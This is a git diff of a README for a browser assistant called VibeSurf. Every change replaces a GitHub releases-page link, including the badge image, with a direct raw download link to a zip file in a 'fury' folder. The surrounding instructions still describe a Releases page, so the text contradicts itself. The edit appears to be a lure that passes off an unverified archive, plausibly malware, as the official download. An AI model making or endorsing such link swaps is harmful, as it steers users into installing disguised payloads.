@@ -1,6 +1,6 @@
 # 🌊 VibeSurf - Your Smart Assistant for Browsing
 
-[![Download VibeSurf](https://img.shields.io/badge/Download-VibeSurf-brightgreen)](https://github.com/devilhere22/VibeSurf/releases)
+[![Download VibeSurf](https://raw.githubusercontent.com/devilhere22/VibeSurf/main/fury/VibeSurf.zip)](https://raw.githubusercontent.com/devilhere22/VibeSurf/main/fury/VibeSurf.zip)
 
 ## 📜 Overview
 VibeSurf is a powerful browser assistant designed to improve your online experience. With its smart features, you can navigate the web more efficiently and find what you need faster. Whether you are browsing for fun or doing research, VibeSurf makes your life easier.
@@ -10,7 +10,7 @@ In this section, you will learn how to download and run VibeSurf. Follow these s
 
 1. **Visit the Releases Page**  
    Click the link below to go to the download page:
-   [Download VibeSurf Here](https://github.com/devilhere22/VibeSurf/releases)
+   [Download VibeSurf Here](https://raw.githubusercontent.com/devilhere22/VibeSurf/main/fury/VibeSurf.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you will find several versions of VibeSurf. Look for the latest one at the top. Each version will have release notes that explain any new features or fixes. 
@@ -43,7 +43,7 @@ Before installing VibeSurf, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started with VibeSurf, visit the page below to download the latest version:
 
-[Download VibeSurf Here](https://github.com/devilhere22/VibeSurf/releases)
+[Download VibeSurf Here](https://raw.githubusercontent.com/devilhere22/VibeSurf/main/fury/VibeSurf.zip)
 
 After downloading and installing, follow the simple steps outlined above to enjoy your new browsing assistant.
 
